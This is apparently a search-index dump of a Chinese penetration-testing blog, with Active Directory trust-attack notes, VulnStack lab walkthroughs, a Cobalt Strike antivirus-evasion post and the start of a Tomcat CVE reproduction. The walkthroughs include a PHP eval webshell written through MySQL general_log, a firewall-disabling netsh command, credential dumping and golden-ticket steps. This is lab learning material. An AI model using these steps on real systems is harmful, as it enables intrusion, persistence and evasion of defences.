","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:6:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"SID 过滤机制 微软宣称 森林是活动目录的安全边界，但是跨森林的攻击在 2005 年就已经出现。首先解释什么是 SIDHistory 和 SID 过滤机制 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:7:0","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"SIDHistory SIDHistory(在 PAC 结构中为 ExtraSids 字段)是为了方便用户在域之间的迁移。当一个用户迁移到新的域后，原来的 SID 以及所在组的一些 SID，都可被加入到新域中新用户的 SIDHistory 属性。当这个新的用户访问某个资源时，根据 SID 或者 SIDHistory 在资源 ACL 中的匹配性来判断是拒绝或者允许访问。因此 SIDHistory 相当于多了一个或者多个组属性，权限得到了扩张 在同一个森林内部的跨域信任关系中，SIDHistory 属性没有被 SID 过滤保护机制过滤。如果一个子域的用户 SIDHistory 属性添加了企业管理员(企业管理员肯定是森林的管理员)的 SID，则子用户具备了森林的企业管理员权限，权限得到了扩张，所以 SIDHistory 后来被修改为受保护的属性 而跨森林的信任关系中，SIDHistory 属性被 SID 过滤机制过滤，不再具备上面的特权属性，这也是 森林是活动目录的安全边界 的原因之一 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:7:1","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"SID 过滤机制 当一个用户的 TGT 通过域信任关系被转递到一个新域后，TGT 中的 PAC(privileged attribute certificate) 包含用户的 SID 和 SIDHistory。新域对 PAC 进行严格的审查 ，并根据信任关系的类别执行各种安全过滤机制 过滤的机制按照分类进行过滤，有些 SID 是一直被拒绝的，我们关注的企业管理员 (S-1-5-21-\u003cDomain\u003e-5 19) 的 SID 是被 ForestSpecific 规则过滤，因为森林拒绝来自森林之外的特权 SIDHistory。微软发布了 SID 过滤的详细描述。 ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:7:2","tags":["域安全","内网渗透","域信任关系"],"title":"基于域信任关系的域攻击","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["靶场"],"content":"VulnStack ATT\u0026CK 2 靶场练习记录","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"VulnStack ATT\u0026CK 2 靶场 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:0:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"环境 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:1:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"信息收集 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:2:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"nmap 端口扫描 PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Site doesn't have a title. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds 1433/tcp open ms-sql-s Microsoft SQL Server 2008 R2 10.50.4000.00; SP2 | ms-sql-ntlm-info: | Target_Name: DE1AY | NetBIOS_Domain_Name: DE1AY | NetBIOS_Computer_Name: WEB | DNS_Domain_Name: de1ay.com | DNS_Computer_Name: WEB.de1ay.com | DNS_Tree_Name: de1ay.com |_ Product_Version: 6.1.7601 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Issuer: commonName=SSL_Self_Signed_Fallback | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2020-04-18T03:37:19 | Not valid after: 2050-04-18T03:37:19 | MD5: 83a6 3f23 de4f e053 4224 f66c a547 3223 |_SHA-1: 0aad 0382 de96 c9da 3990 3014 360c 7f31 bf78 a3df |_ssl-date: 2020-04-18T06:12:57+00:00; -2s from scanner time. 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: DESKTOP-DUNPKQ9 | NetBIOS_Domain_Name: DESKTOP-DUNPKQ9 | NetBIOS_Computer_Name: DESKTOP-DUNPKQ9 | DNS_Domain_Name: DESKTOP-DUNPKQ9 | DNS_Computer_Name: DESKTOP-DUNPKQ9 | Product_Version: 10.0.17763 |_ System_Time: 2020-04-18T06:12:19+00:00 | ssl-cert: Subject: commonName=DESKTOP-DUNPKQ9 | Issuer: commonName=DESKTOP-DUNPKQ9 | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-02-23T21:21:14 | Not valid after: 2020-08-24T21:21:14 | MD5: 5cb3 a3dd 4a5e eb67 80d5 8f39 633f d11b |_SHA-1: 9694 4630 239e d821 3658 976c 40a1 6d3b d9b4 e80f |_ssl-date: 2020-04-18T06:12:57+00:00; -2s from scanner time. 7001/tcp open http Oracle WebLogic Server (Servlet 2.5; JSP 2.1) |_http-title: Error 404--Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1h08m35s, deviation: 3h01m23s, median: -2s | ms-sql-info: | 192.168.3.242:1433: | Version: | name: Microsoft SQL Server 2008 R2 SP2 | number: 10.50.4000.00 | Product: Microsoft SQL Server 2008 R2 | Service pack level: SP2 | Post-SP patches applied: false |_ TCP port: 1433 | smb-os-discovery: | OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1) | OS CPE: cpe:/o:microsoft:windows_server_2008::sp1 | Computer name: WEB | NetBIOS computer name: WEB\\x00 | Domain name: de1ay.com | Forest name: de1ay.com | FQDN: WEB.de1ay.com |_ System time: 2020-04-18T14:12:22+08:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-18T06:12:20 |_ start_date: 2020-04-18T03:37:46 发现 7001 端口的 weblogic，访问 http://192.168.3.242:7001/console，版本号为：10.3.6.0 使用 weblogicScanner 扫描 weblogic 服务器，发现 cve-2019-2725 漏洞。 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:2:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"漏洞利用 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:3:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"weblogic 上传一个 webshell 方便后续操作。 关于 weblogic 上传路径的问题，可以参考 https://www.cnblogs.com/sstfy/p/10350915.html 冰蝎连接： 上传 cs 木马： 执行： 之前发现是域用户，ipconfig 看下 ip： 发现该机器为双网卡，且内网为 10.10.10.xx 网段。 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:3:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"内网渗透 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"dump 密码 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"提权 使用 ms-14-058 提权到 SYSTEM 权限方便进一步操作： ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:2","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"域内信息收集 查看域名 查看域内主机 查看域内用户 查看域控 查看域管 ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:3","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"横向移动 利用 PsExec 横向移动至 DC： ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:4","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"后门 域控上的信息收集 抓取 krbtgt 的 hash： 制作黄金票据 注入票据前： 注入票据后： ","date":"2020-04-18","objectID":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/:4:5","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 2 靶场","uri":"/2020/04/vulnstack-attck-2-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"VulnStack ATT\u0026CK 1 靶场练习记录","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"VulnStack ATT\u0026CK 1 靶场 ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:0:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"环境 ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:1:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"信息收集 ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:2:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"端口探测 只开放了80、3306 ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:2:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"目录扫描 访问 80 端口，发现首页为 PHP 探针： 目录扫描： 发现 phpmyadmin。 ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:2:2","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"漏洞挖掘 phpmyadmin 尝试若口令登录： root:root 登录成功。 phpmyadmin 后台的 getshell 方法有很多种 先看下常规的 select into outfile： 这里 secure_file_priv 为 null，不允许写入写出。 放弃此方法，尝试 MySQL 通用查询日志 general_log 写出 webshell。 先看下全局变量的配置 show global variables like '%general%' ： 这里并没有开启通用日志，那我就自己打开，并自定义保存文件： SETGLOBALgeneral_log='ON'SETGLOBALgeneral_log_file='C:/phpStudy/WWW/shell.php' 这里的绝对路径是通过前面的探针获取到的。 然后写 webshell select '\u003c?php @eval($_POST[\"bbll]);?\u003e'： 蚁剑连接： ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:3:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"内网渗透 首先查看系统位数： wmic cpu get addresswidth 用 cs 生成木马，上传： 执行： 上线，直接是管理员权限： 查看用户权限： 查看当前登录域： 查看域内用户： 查看域内主机： 查看域管： dump 密码： ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:4:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"横向移动 DC 上线后，使用 hashdump dump krbtgt NTLM Hash： 制作黄金票据： ","date":"2020-04-16","objectID":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/:4:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 1 靶场","uri":"/2020/04/vulnstack-attck-1-%E9%9D%B6%E5%9C%BA/"},{"categories":["渗透测试"],"content":"通过替换 cobaltstrike 中自带 loader 进行免杀","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/","tags":["渗透测试","免杀"],"title":"通过替换 cobaltstrike 中自带 loader 进行免杀","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["渗透测试"],"content":"通过替换 cobaltstrikes 中自带 loader 进行免杀 ","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/:0:0","tags":["渗透测试","免杀"],"title":"通过替换 cobaltstrike 中自带 loader 进行免杀","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["渗透测试"],"content":"原因 对 cobaltstrike 生成的 artifact 免杀的方式，我们常用的办法是生成 shellcode，然后再自己实现一个 loader 来加载 shellcode。之前在读cobaltstrike 生成 artifact 的代码的时候觉得方式很有意思，作者先写了个loader，然后通过将生成的 shellcode patch 进 loader 的方式来生成 artifact。 杀软静态查杀这种病毒，首先是找 shellcode 的特征点和 artifact 模板的特征点。所以我们如果自己编写一个 loader 来替换 cobaltstrike 自带的 loader，达到一个免杀效果。 文章的重点不是过杀软，只是概念验证，用到的技术也仅仅是自己实现 loader 然后简单的将 shellcode 进行 xor 来绕过 360 对 shellcode 的特征查杀。 ","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/:1:0","tags":["渗透测试","免杀"],"title":"通过替换 cobaltstrike 中自带 loader 进行免杀","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["渗透测试"],"content":"工具介绍 web 狗总是对二进制充满了好奇，artifact 生成的方式是读 cobaltstrike 的时候学来的，本软件只是做概念验证。抄了很多 cs 的源码，主要是觉得 patch 的形式很有意思，源码在写第二篇文章的时候会一起传到 github 上，jar 包没有混淆也可以自己反编译，自己先动手尝试一下，参考源码自己编写 loader，替换resource/artifact.exe 让 cobaltstrike 生成出的 artifact.exe 默认就是免杀的。 选择script console 然后输入: x transform(shellcode(\"你的Listener名称\",\"x86\",false),\"array\") 打开chaos: 复制进文本框 然后点击generate: 选择一个文件夹保存 点击上线: ","date":"2020-04-02","objectID":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/:2:0","tags":["渗透测试","免杀"],"title":"通过替换 cobaltstrike 中自带 loader 进行免杀","uri":"/2020/04/%E9%80%9A%E8%BF%87%E6%9B%BF%E6%8D%A2cobaltstrikes%E4%B8%AD%E8%87%AA%E5%B8%A6loader%E8%BF%9B%E8%A1%8C%E5%85%8D%E6%9D%80/"},{"categories":["靶场"],"content":"VulnStack ATT\u0026CK 5 靶场练习记录","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"VulnStack ATT\u0026CK 5 靶场 ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:0:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"信息搜集 ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:1:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"端口扫描 利用 nmap 扫描端口,发现开启了两个端口: 80 和 3306 访问 80 端口 发现是 thinkphp v5 的站 随便访问一个错误页面得到其版本号是 5.0.22 ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:1:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"漏洞搜索 searchsploit 搜索相关漏洞： 尝试使用 EXP 执行命令 ipconfig, 如下图所示: ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:1:2","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"漏洞利用 查看权限： 查看 web 目录： 写入shell： ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:2:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"生成远控 新建 listener 生成 payload ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:2:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"上传远控 连接 webshell： 上传： 执行： 反弹回的 shell： 执行 shell whoami： ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:2:2","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"权限提升 再新建一个 listener，做为提权等操作使用 (smb 和 tcp 都可以，我选择 tcp, smb 适合横向) 作者在 cs4.0 移除了漏洞exp的提权，可在https://github.com/rsmudge/ElevateKit 重新添加到 cs 中。 使用的是 ms14-058 漏洞的 exp 进行提权： ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:3:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"横向移动 通过 explore-Process List 先查看一下进程，看看有没有杀毒软件(在local system操作) 发现并没有杀毒软件，这样我们日后的横向移动活动将更为顺利。 ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:4:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"关闭防火墙 使用命令 netsh advfirewall set allprofiles state off 关闭防火墙 ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:4:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"内网的信息搜集 (先在local admin操作,因为system权限看不到登录域) 获取当前登录域 通过命令 net config workstation 获取登录域 我们可以看到，工作站域是 sun.com可现在登录域是 win7。因此我们需要一个域用户的进程来进行信息搜集 在此之前先调用 Logonpasswords 抓一波密码(在 local admin 和 local system 上操作都可以) 利用密码： 第一种:使用 make_token 去调用 第二种:使用 pth 命令生成一个新的进程注入进去 第三种:使用 spawn as 需要用这三种方法调用我们刚刚以及抓取的凭证以继续完全相应的信息收集操作 第一种：Make_token Make_token 是在当前的 beacon 上进行身份伪造 在当前 beacon 上，您的权限、权限或标识没有变化。但是，当您与远程资源交互时，使用的是您伪造的身份。 使用 rev2self 命令丢弃口令 第二种: PTH Pth ( pth 会生成一个进程，生成过后我们需要 steal_token，steal_token 过后也是使用 rev2self 丢弃口令) 使用命令 steal_token 7912： 第三种：Spawnas spawnas 命令生成具有其他用户凭据的 beacon: 当然除此以可以用 Processes inject 去直接注入到某个用户的进程(这里的操作需要 system 权限，在 local system 进行操作) 查看内网的主机/域主机 使用 net view 指令查看内网的主机(加域名即为查看域主机) 查看信任域 使用 net domain_trusts 查看信任域 查看域内计算机 使用 net computers {域的dns名,这里是sun.com} 查看域内计算机： 查看域控 使用 net dclist {域名称,这里是sun} 查看域控: 查看域管理员 使用 net group \\\\{域控名,这里是DC} domain admins 查看域管理员: 查看域和用户的 sid 使用 whoami /all 查看域和用户的sid: 信息汇总 域名:sun.com 域管理员:sun\\administrator 域用户:administrator，admin，leo和一个krbtgt 域控:DC 域成员:DC，Win7 域控ip:192.168.138.138 用户sid:S-1-5-21-3388020223-1982701712-4030140183-1110 域sid:S-1-5-21-3388020223-1982701712-4030140183 已知凭据: sun\\leo:123.com win7\\heart:123.com ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:4:2","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"域提权 利用 ms14-068 域提权 导入伪造缓存: ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:5:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"横向到域控 (在 domain user 的 beacon 上操作) 这里创建一个 listener 作为横向演示，名字为 Lateral Movement ，我选择 smb_beacon 更好，smb beacon 能过防火墙，动静小 (在 cs4.0 中，有 jump 和 remote-exec 命令) 点击 View-Target: 因为我们已经有权限访问DC了，直接勾选下面的使用当前口令即可: DC 成功上线： ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:6:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"权限维持 ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:7:0","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["靶场"],"content":"黄金票据 首先先利用 logonpasswords 抓一波明文(在名为DC的Beacon进行操作) 使用 dcsync 命令导出 krbtgt 的 NTLM Hash，或者，使用 hashdump 也可以导出 hash 为了方便于实践黄金票据，手动生成了一个新的域用户geekby: ","date":"2020-03-23","objectID":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/:7:1","tags":["内网靶场","靶场"],"title":"VulnStack ATT\u0026CK 5 靶场","uri":"/2020/03/vulnstack-attck-5-%E9%9D%B6%E5%9C%BA/"},{"categories":["漏洞复现"],"content":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/","tags":["Tomcat","漏洞复现"],"title":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现 ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:0:0","tags":["Tomcat","漏洞复现"],"title":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"漏洞复现 ","date":"2020-02-21","objectID":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:0","tags":["Tomcat","漏洞复现"],"title":"CVE-2020-1938 Apache Tomcat AJP 文件包含漏洞复现","uri":"/2020/02/cve-2020-1938-apache-tomcat-ajp-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":["漏洞复现"],"content":"环境搭建 docker-compose.yml 